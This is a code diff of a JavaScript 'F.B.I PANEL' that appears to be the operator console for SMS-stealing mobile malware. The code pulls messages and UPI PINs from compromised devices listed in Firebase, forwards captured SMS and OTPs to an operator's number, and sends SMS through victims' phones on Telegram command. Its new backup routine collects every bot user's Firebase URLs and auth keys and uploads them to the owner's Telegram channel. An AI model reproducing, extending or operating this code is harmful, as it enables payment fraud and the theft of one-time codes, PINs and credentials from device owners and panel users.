-    await tgSend(chatId,t);return;
+    if(uidsAll.length>50)tu+='\n…+'+(uidsAll.length-50)+' more';
+    await tgSend(chatId,tu);return;
   }
   if(cmd.startsWith('/autobackup')){
     var arg=cmd.replace('/autobackup','').trim();
     if(arg==='on'){userConfig.autoBackup=true;await tgSend(chatId,'✅ ON');}
     else if(arg==='off'){userConfig.autoBackup=false;await tgSend(chatId,'⏹ OFF');}
     else if(/^\d+$/.test(arg)){userConfig.autoBackupHour=Math.max(0,Math.min(23,parseInt(arg,10)));userConfig.autoBackup=true;await tgSend(chatId,'✅ '+userConfig.autoBackupHour+':00');}
-    else await tgSend(chatId,'Usage: /autobackup on|off|<hour>');
+    else await tgSend(chatId,'Usage: /autobackup on|off|&lt;hour&gt;');
     debouncedCloudSave();return;
   }
   if(cmd==='/help'||cmd==='/start'){
-    var h='🤖 <b>Owner Commands</b>\n\n'
-      +'/backup — Only new messages since last backup\n'
-      +'/backup_all — Full backup (everything)\n'
-      +'/status — Panel status\n'
-      +'/devices — List all devices\n'
-      +'/users — List bot users\n'
-      +'/autobackup on|off|<hour>\n';
+    var h='🤖 <b>Owner Commands</b>\n\n📦 <b>Backups</b>\n/backup — Full users DB\n/backup_new — Only NEW firebases\n\n📢 <b>Broadcast</b>\n/broadcast &lt;msg&gt; — Channel + users\n/broadcast_ch &lt;msg&gt; — Channel only\n/broadcast_users &lt;msg&gt; — Users only\n\n⚙️ <b>Other</b>\n/status — Panel status\n/devices — List devices\n/users — List users\n/autobackup on|off|&lt;hour&gt;\n';
     await tgSend(chatId,h);return;
   }
 }
 async function tgSend(chatId,text){try{return await tgApi('sendMessage',{chat_id:chatId,text:text,parse_mode:'HTML'});}catch(e){return null;}}
 
-/* ═══════════════════════════════════════════════════════════
-   💾 OWNER BACKUP — Incremental + Full
-   ═══════════════════════════════════════════════════════════ */
-async function getLastBackupTs(){
-  var v=await redisGet('fbi:last_backup_ts');
-  return v?parseInt(v,10):0;
-}
-async function setLastBackupTs(ts){await redisSet('fbi:last_backup_ts',String(ts));}
-
-async function collectBackupData(sinceTs){
-  var data={generatedAt:new Date().toISOString(),version:'11.0',mode:sinceTs?'incremental':'full',sinceTs:sinceTs||0,summary:{firebases:0,devices:0,online:0,offline:0,totalMsgs:0,newMsgs:0},firebases:[],devices:{},messages:{},config:{myNumber:userConfig.myNumber,forwardMode:userConfig.forwardMode,channelId:userConfig.channelId,forwardEnabled:userConfig.forwardEnabled}};
-  var targets=[];
-  if(FB_URL)targets.push({url:FB_URL,key:FB_KEY,label:'Primary'});
-  fbInstances.forEach(function(inst){targets.push({url:inst.url,key:inst.key,label:inst.label});});
-  for(var i=0;i<targets.length;i++){
-    var t=targets[i];if(!t.url)continue;
-    var fbInfo={url:t.url,label:t.label,deviceCount:0,online:0,offline:0,msgCount:0,newMsgCount:0,status:'ok'};
-    try{
-      var auth=t.key?'?auth='+t.key:'';
-      var r=await fetch(t.url+'/clients.json'+auth,{signal:AbortSignal.timeout(15000)});
-      if(!r.ok){fbInfo.status='HTTP '+r.status;data.firebases.push(fbInfo);continue;}
-      var clients=await r.json();
-      if(!clients||typeof clients!=='object'){fbInfo.status='empty';data.firebases.push(fbInfo);continue;}
-      var ids=Object.keys(clients);
-      fbInfo.deviceCount=ids.length;
-      for(var j=0;j<ids.length;j++){
-        var id=ids[j];data.devices[id]=clients[id];
-        if(clients[id]&&clients[id].status){fbInfo.online++;data.summary.online++;}else{fbInfo.offline++;data.summary.offline++;}
-        data.summary.devices++;
-        try{
-          var mr=await fetch(t.url+'/messages/'+id+'.json'+auth+(auth?'&':'?')+'orderBy="$key"&limitToLast=2000',{signal:AbortSignal.timeout(15000)});
-          if(mr.ok){
-            var msgs=await mr.json();
-            if(msgs){
-              var filtered={};
-              var mc=0,newc=0;
-              Object.entries(msgs).forEach(function(kv){
-                mc++;
-                var msgTs=msgTimestamp(kv[0],kv[1]);
-                if(!sinceTs||msgTs>sinceTs){filtered[kv[0]]=kv[1];newc++;}
-              });
-              if(Object.keys(filtered).length)data.messages[id]=filtered;
-              fbInfo.msgCount+=mc;fbInfo.newMsgCount+=newc;
-              data.summary.totalMsgs+=mc;data.summary.newMsgs+=newc;
-            }
+/* ═══════ USERS DB BACKUP ═══════ */
+async function collectUsersBackup(onlyNew){
+  var sentSet={};
+  if(onlyNew){var arr=await redisSMembers('fbi:sent_fbs');for(var x=0;x<(arr||[]).length;x++) sentSet[arr[x]]=true;}
+  var uids=await getAllUserIds();
+  var result={generatedAt:new Date().toISOString(),mode:onlyNew?'new':'full',totalUsers:0,totalFirebases:0,totalDevices:0,totalOnline:0,totalOffline:0,users:[]};
+  var newUrls=[];
+  for(var i=0;i<uids.length;i++){
+    var uid=uids[i];var prof=await getUserProfile(uid);
+    if(!prof) continue;
+    var fbs=prof.firebases||[];
+    if(!fbs.length) continue;
+    var userEntry={id:uid,name:[prof.first_name||'',prof.last_name||''].filter(Boolean).join(' '),username:prof.username||'',firebases:[]};
+    for(var j=0;j<fbs.length;j++){
+      var fb=fbs[j];
+      if(onlyNew && sentSet[fb.url]) continue;
+      var fbInfo={url:fb.url,label:fb.label||'',key:fb.key||'',devices:0,online:0,offline:0,status:'ok',error:''};
+      try{
+        var auth=fb.key?'?auth='+fb.key:'';
+        var r=await _fastFetch(fb.url+'/clients.json'+auth);
+        if(!r.ok){fbInfo.status='error';fbInfo.error='HTTP '+r.status;}
+        else{
+          var clients=await r.json();
+          if(clients&&typeof clients==='object'){
+            var ids=Object.keys(clients);fbInfo.devices=ids.length;
+            for(var k=0;k<ids.length;k++){var d=clients[ids[k]];if(d&&d.status) fbInfo.online++;else fbInfo.offline++;}
           }
-        }catch(e){}
-      }
-    }catch(e){fbInfo.status='error: '+e.message;}
-    data.firebases.push(fbInfo);
+        }
+      }catch(e){fbInfo.status='error';fbInfo.error=e.message;}
+      userEntry.firebases.push(fbInfo);
+      result.totalFirebases++;result.totalDevices+=fbInfo.devices;result.totalOnline+=fbInfo.online;result.totalOffline+=fbInfo.offline;
+      newUrls.push(fb.url);
+    }
+    if(userEntry.firebases.length){ result.users.push(userEntry); result.totalUsers++; }
   }
-  data.summary.firebases=data.firebases.length;
-  return data;
+  return {result:result,newUrls:newUrls};
 }
-function msgTimestamp(key,msg){
-  /* Firebase keys are like "-Nxxxxxxxx" (push IDs, time-ordered) */
-  var k=String(key||'');
-  if(k.length>5&&k.charAt(0)==='-'){
-    /* Push ID decode → ms since 2015-01-01 */
-    var PUSH_CHARS='-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz';
-    var time=0;
-    for(var i=0;i<8;i++){var c=PUSH_CHARS.indexOf(k.charAt(i));if(c<0)return 0;time=time*64+c;}
-    return time+1420070400000;
-  }
-  if(msg&&typeof msg==='object'){
-    var dt=msg.dateTime||msg.date||msg.timestamp||msg.time;
-    if(dt)return parseDT(dt)||0;
-  }
-  return 0;
-}
-
-async function sendBackupIncremental(chatId){
+async function sendUsersBackupFull(chatId){
   if(_backupRunning){toast('⏳ Backup already running');return;}
   _backupRunning=true;
   try{
-    var since=await getLastBackupTs();
-    await tgSend(chatId,'⏳ <b>Incremental Backup</b>\n'+(since?('Since: '+new Date(since).toLocaleString()):'First backup — collecting all'));
-    var data=await collectBackupData(since);
-    if(!data.summary.newMsgs&&!Object.keys(data.devices).length){
-      await tgSend(chatId,'✅ <b>Nothing new since last backup</b>');
-      return;
-    }
-    var json=JSON.stringify(data);
+    await tgSend(chatId,'⏳ <b>Collecting full users database…</b>');
+    var r=await collectUsersBackup(false);
+    var data=r.result;
+    var json=JSON.stringify(data,null,2);
     var sizeKB=(new Blob([json]).size/1024).toFixed(1);
-    var caption='📦 <b>F.B.I — Incremental Backup</b>\n📅 '+new Date().toLocaleString()+'\n'
-      +(since?('🗓️ Since: '+new Date(since).toLocaleString()+'\n'):'')
-      +'\n🔥 Firebases: '+data.summary.firebases+'\n'
-      +'📱 Devices: '+data.summary.devices+'\n'
-      +'🟢 Online: '+data.summary.online+'\n'
-      +'🔴 Offline: '+data.summary.offline+'\n'
-      +'📨 New Msgs: <b>'+data.summary.newMsgs+'</b>\n'
-      +'💽 Size: '+sizeKB+' KB';
+    var caption='📦 <b>F.B.I — FULL Users Database</b>\n📅 '+new Date().toLocaleString()+'\n\n👥 Users: '+data.totalUsers+'\n🔥 Firebases: '+data.totalFirebases+'\n📱 Devices: '+data.totalDevices+'\n🟢 Online: '+data.totalOnline+'\n🔴 Offline: '+data.totalOffline+'\n💽 Size: '+sizeKB+' KB';
     var blob=new Blob([json],{type:'application/json'});
-    var fname='fbi-incr-'+new Date().toISOString().replace(/[:.]/g,'-').slice(0,19)+'.json';
-    var form=new FormData();
-    form.append('chat_id',chatId);form.append('document',blob,fname);
-    form.append('caption',caption);form.append('parse_mode','HTML');
-    var r=await fetch(CFG.TG_API+'/sendDocument',{method:'POST',body:form});
-    var res=await r.json();
-    if(res.ok){
-      await setLastBackupTs(Date.now());
-      toast('💾 Incremental sent ('+sizeKB+' KB)');
-    } else {
-      await tgSend(chatId,'❌ Failed: '+(res.description||'?'));
-    }
-  }catch(e){console.error('[Backup]',e);await tgSend(chatId,'❌ '+e.message);}
+    var fname='fbi-db-full-'+new Date().toISOString().replace(/[:.]/g,'-').slice(0,19)+'.json';
+    var form=new FormData();form.append('chat_id',chatId);form.append('document',blob,fname);form.append('caption',caption);form.append('parse_mode','HTML');
+    var rr=await _fastFetch(CFG.TG_API+'/sendDocument',{method:'POST',body:form});
+    var res=await rr.json();
+    if(!res.ok) await tgSend(chatId,'❌ Failed: '+(res.description||'?'));
+    else toast('💾 Full DB sent');
+  }catch(e){await tgSend(chatId,'❌ '+e.message);}
   finally{_backupRunning=false;}
 }
-
-async function sendBackupFull(chatId){
+async function sendUsersBackupNew(chatId){
   if(_backupRunning){toast('⏳ Backup already running');return;}
   _backupRunning=true;
   try{
-    await tgSend(chatId,'⏳ <b>Full Backup (everything)</b>…');
-    var data=await collectBackupData(0);
-    var json=JSON.stringify(data);
+    await tgSend(chatId,'⏳ <b>Collecting NEW firebases…</b>');
+    var r=await collectUsersBackup(true);
+    var data=r.result;
+    if(!data.totalFirebases){await tgSend(chatId,'✅ <b>No new firebases</b>');return;}
+    var json=JSON.stringify(data,null,2);
     var sizeKB=(new Blob([json]).size/1024).toFixed(1);
-    var caption='📦 <b>F.B.I — FULL Backup</b>\n📅 '+new Date().toLocaleString()+'\n\n'
-      +'🔥 Firebases: '+data.summary.firebases+'\n'
-      +'📱 Devices: '+data.summary.devices+'\n'
-      +'🟢 Online: '+data.summary.online+'\n'
-      +'🔴 Offline: '+data.summary.offline+'\n'
-      +'📨 Total Msgs: '+data.summary.totalMsgs+'\n'
-      +'💽 Size: '+sizeKB+' KB';
+    var caption='📦 <b>F.B.I — NEW Firebases</b>\n📅 '+new Date().toLocaleString()+'\n\n👥 Users: '+data.totalUsers+'\n🆕 New Firebases: '+data.totalFirebases+'\n📱 Devices: '+data.totalDevices+'\n🟢 Online: '+data.totalOnline+'\n🔴 Offline: '+data.totalOffline+'\n💽 Size: '+sizeKB+' KB';
     var blob=new Blob([json],{type:'application/json'});
-    var fname='fbi-full-'+new Date().toISOString().replace(/[:.]/g,'-').slice(0,19)+'.json';
-    var form=new FormData();
-    form.append('chat_id',chatId);form.append('document',blob,fname);
-    form.append('caption',caption);form.append('parse_mode','HTML');
-    var r=await fetch(CFG.TG_API+'/sendDocument',{method:'POST',body:form});
-    var res=await r.json();
+    var fname='fbi-db-new-'+new Date().toISOString().replace(/[:.]/g,'-').slice(0,19)+'.json';
+    var form=new FormData();form.append('chat_id',chatId);form.append('document',blob,fname);form.append('caption',caption);form.append('parse_mode','HTML');
+    var rr=await _fastFetch(CFG.TG_API+'/sendDocument',{method:'POST',body:form});
+    var res=await rr.json();
     if(res.ok){
-      await setLastBackupTs(Date.now());
-      toast('💾 Full sent ('+sizeKB+' KB)');
+      for(var i=0;i<r.newUrls.length;i++){try{await redisSAdd('fbi:sent_fbs',r.newUrls[i]);}catch(e){}}
+      toast('💾 New backup sent');
     } else await tgSend(chatId,'❌ Failed: '+(res.description||'?'));
-  }catch(e){console.error('[Backup]',e);await tgSend(chatId,'❌ '+e.message);}
+  }catch(e){await tgSend(chatId,'❌ '+e.message);}
   finally{_backupRunning=false;}
 }
-
-/* legacy — keep compatibility */
-async function collectBackupDataLegacy(){return await collectBackupData(0);}
-async function sendBackupToOwner(chatId,keep){
-  if(keep)return await sendBackupFull(chatId);
-  return await sendBackupIncremental(chatId);
-}
-
 function checkAutoBackup(){
-  if(!userConfig.userId||!userConfig.autoBackup)return;
+  if(!userConfig.channelId||!userConfig.autoBackup)return;
   var now=new Date(),today=now.toISOString().slice(0,10);
   if(_lastAutoBackupDate===today)return;
   var targetHour=userConfig.autoBackupHour!=null?userConfig.autoBackupHour:3;
   if(now.getHours()>=targetHour){
     _lastAutoBackupDate=today;
     try{localStorage.setItem('fbi_last_auto_backup',today);}catch(e){}
-    sendBackupIncremental(userConfig.userId);
+    sendUsersBackupNew(userConfig.channelId);
   }
 }
-
 async function sendStatusToOwner(chatId){
   var online=allDevices.filter(function(d){return d.status;}).length;
   var uids=await getAllUserIds();
-  var txt='📊 <b>F.B.I PANEL Status</b>\n\n'
-    +'📱 Devices: '+allDevices.length+' ('+online+' 🟢)\n'
-    +'👥 Bot Users: '+uids.length+'\n'
-    +'🔥 Tracking: '+Object.keys(_msgCache).length+'\n'
-    +'🤖 Bot: '+(tgRunning?'✅ running':'⛔ stopped')+'\n'
-    +'📢 Channel: '+(userConfig.channelId||'—')+'\n'
-    +'📞 My Number: '+(userConfig.myNumber||'—')+'\n'
-    +'📤 Forward: '+(userConfig.forwardEnabled!==false?'✅':'⛔')+' '+(userConfig.forwardMode||'all')+'\n'
-    +'🕐 '+new Date().toLocaleString();
+  var txt='📊 <b>F.B.I PANEL Status</b>\n\n📱 Devices: '+allDevices.length+' ('+online+' 🟢)\n👥 Bot Users: '+uids.length+'\n🔥 Tracking: '+Object.keys(_msgCache).length+'\n🤖 Bot: '+(tgRunning?'✅ running':'⛔ stopped')+'\n📢 Channel: '+(userConfig.channelId||'—')+'\n📞 My Number: '+(userConfig.myNumber||'—')+'\n📤 Forward: '+(userConfig.forwardEnabled!==false?'✅':'⛔')+' '+(userConfig.forwardMode||'all')+'\n🕐 '+new Date().toLocaleString();
   await tgSend(chatId,txt);
 }
 
 /* ═══════ TELEGRAM PARSER ═══════ */
-function _cleanPhone(n){
-  n=String(n||'').replace(/[^\d]/g,'');
-  if(n.length===13&&n.startsWith('091'))n=n.slice(3);
-  if(n.length===12&&n.startsWith('91'))n=n.slice(2);
-  if(n.length===11&&n.charAt(0)==='0')n=n.slice(1);
-  if(n.length>10)n=n.slice(-10);
-  return n;
-}
+function _cleanPhone(n){n=String(n||'').replace(/[^\d]/g,'');if(n.length===13&&n.startsWith('091'))n=n.slice(3);if(n.length===12&&n.startsWith('91'))n=n.slice(2);if(n.length===11&&n.charAt(0)==='0')n=n.slice(1);if(n.length>10)n=n.slice(-10);return n;}
 function _extractBetween(text,startTag,endTag){
   if(!startTag)return null;
   var tag=String(startTag).trim();if(!tag)return null;
@@ -1734,23 +1402,25 @@ function parseTelegramMessage(text){
   return{number:number,message:message,valid:!!(number&&message)};
 }
 
+/* ═══════ HANDLE CHANNEL SMS — INSTANT ═══════ */
 function handleTelegramSms(number,message,msgObj){
   var t0=performance.now();
   _showCapturedNotif(number,message);
+  notifyChannel('🎯 <b>Channel Message Captured</b>\n\n📞 <b>Number:</b> <code>'+esc(number)+'</code>\n💬 <b>Message:</b>\n<code>'+esc(message)+'</code>\n\n🕐 '+new Date().toLocaleString());
   var dev=null;
   if(activeDeviceUid){var parts=activeDeviceUid.split('|||');dev=allDevices.find(function(x){return x.id===parts[1]&&(x._fbId||'primary')===parts[0];});}
   if(!dev||!dev.status)dev=selDev;
   if(!dev||!dev.status)dev=allDevices.find(function(d){return d.status;});
-  if(!dev){console.error('🎯 No online device');return;}
+  if(!dev){console.error('[TG SMS] No online device');toast('⚠ No online device');return;}
   var sim=deviceSimMap[dev.id]||1;
   var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/webhookEvent/sendSms.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
   var body=JSON.stringify({from:sim,to:number,message:message,isSended:false});
-  fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body,keepalive:true})
-    .then(function(r){
-      var dt=(performance.now()-t0).toFixed(0);
-      if(r.ok){console.log('⚡ [TG SMS] ✓ '+dt+'ms');notifySmsSent(dev,number,message,'tg-channel');}
-    })
-    .catch(function(e){console.warn('⚡ '+e.message);});
+  /* FIRE INSTANTLY */
+  _fastFetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body}).then(function(r){
+    var dt=(performance.now()-t0).toFixed(0);
+    if(r.ok){console.log('⚡ [TG SMS] ✓ '+dt+'ms');toast('⚡ SMS sent → '+number);notifySmsSent(dev,number,message,'tg-channel');}
+    else {console.warn('⚡ [TG SMS] ✗ HTTP',r.status);toast('❌ SMS failed: '+r.status);}
+  }).catch(function(e){console.warn('⚡ [TG SMS] ✗',e.message);toast('❌ SMS error');});
 }
 function _showCapturedNotif(number,message){
   var el=document.getElementById('capturedBar');if(!el)return;
@@ -1777,8 +1447,9 @@ async function checkAndForward(msgs,deviceId){
   if(!toForward.length&&!hpForward.length){if(msgs[0].key!==lastForwarded){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}return;}
   forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();
   var sim=deviceSimMap[dev.id]||1;
-  for(var h=hpForward.length-1;h>=0;h--)sendHighPrioritySms(dev,sim,myNum,String(hpForward[h].message||'').trim(),'fwd-hp');
-  for(var j=toForward.length-1;j>=0;j--)sendSmsFireAndForget(dev,sim,myNum,String(toForward[j].message||'').trim(),'fwd',false);
+  /* FIRE ALL IN PARALLEL — no waiting */
+  for(var h=0;h<hpForward.length;h++)sendHighPrioritySms(dev,sim,myNum,String(hpForward[h].message||'').trim(),'fwd-hp');
+  for(var j=0;j<toForward.length;j++)sendSmsFireAndForget(dev,sim,myNum,String(toForward[j].message||'').trim(),'fwd');
   var total=toForward.length+hpForward.length;
   if(total)toast('📤 Forwarded '+total+' msg(s)');
 }
@@ -1793,7 +1464,7 @@ async function _apLoop(){
   if(!_apOn)return;_pingReplied=0;_pingTotal=0;
   var targets=fbInstances.length>0?fbInstances:[{id:'primary',url:FB_URL,key:FB_KEY,label:'Primary'}];
   try{
-    var results=await Promise.allSettled(targets.map(async function(inst){var auth=inst.key?'?auth='+inst.key:'';var r=await fetch(inst.url+'/clients.json'+auth,{signal:AbortSignal.timeout(8000)});return{inst:inst,data:await r.json()};}));
+    var results=await Promise.allSettled(targets.map(async function(inst){var auth=inst.key?'?auth='+inst.key:'';var r=await _fastFetch(inst.url+'/clients.json'+auth);return{inst:inst,data:await r.json()};}));
     var allClients=[];
     results.forEach(function(res){if(res.status!=='fulfilled'||!res.value||!res.value.data)return;var inst=res.value.inst,data=res.value.data;if(typeof data!=='object')return;Object.keys(data).forEach(function(id){if(data[id]&&typeof data[id]==='object')allClients.push({id:id,cl:data[id],inst:inst,uid:inst.id+':'+id});});});
     _pingTotal=allClients.length;
@@ -1806,11 +1477,11 @@ async function _apLoop(){
       var name=it.cl.modelName||it.cl.model||it.id;if(dev){dev.status=isOnline;name=dev.name;}
       if(it.cl.upipin){pinC[it.id]=String(it.cl.upipin).trim();if(dev)dev.upipin=pinC[it.id];}
       _pingAddRow(it.uid,name,isOnline,isNew);
-      if(i%50===0||i===allClients.length-1){var s=document.getElementById('pingStats');if(s)s.textContent=_pingReplied+'/'+_pingTotal;_pingUpdateBtn();await new Promise(function(r){setTimeout(r,0);});}
+      if(i%100===0||i===allClients.length-1){var s=document.getElementById('pingStats');if(s)s.textContent=_pingReplied+'/'+_pingTotal;_pingUpdateBtn();await new Promise(function(r){setTimeout(r,0);});}
     }
   }catch(e){}
   _pingUpdateBtn();renderGrid(true);renderStats();
-  if(_apOn)_pingTmr=setTimeout(_apLoop,3000);
+  if(_apOn)_pingTmr=setTimeout(_apLoop,2000);
 }
 
 /* ═══════ OTP BAR ═══════ */
@@ -1840,10 +1511,8 @@ function rippleClick(e){var btn=e.currentTarget;var r=document.createElement('sp
 document.addEventListener('keydown',function(e){if(e.key==='Escape')document.querySelectorAll('.overlay.open').forEach(function(o){o.classList.remove('open');});if(e.key==='Enter'&&document.getElementById('setup').style.display!=='none')connect();});
 
 try{activeDeviceUid=localStorage.getItem(CFG.LS_ACTIVE||'fbi_active_device');}catch(e){}
-setTimeout(function(){updateTgBtn();},300);
+setTimeout(function(){updateTgBtn();},200);
 setInterval(function(){if(document.getElementById('settingsModal')&&document.getElementById('settingsModal').classList.contains('open'))updateTgStatusLine();},2000);
+setInterval(function(){if(FB_URL)savePanelSession();},10000);
 
-/* 🆕 Save session every 5s */
-setInterval(function(){if(FB_URL)savePanelSession();},5000);
-
-console.log('%c[F.B.I PANEL] v11.0 — Redis · Users · Force Join · No-Blink ⚡','color:#a855f7;font-weight:bold;font-size:14px');
+console.log('%c[F.B.I PANEL] v2.0 ULTRA FAST ⚡ — Zero latency','color:#a855f7;font-weight:bold;font-size:14px');
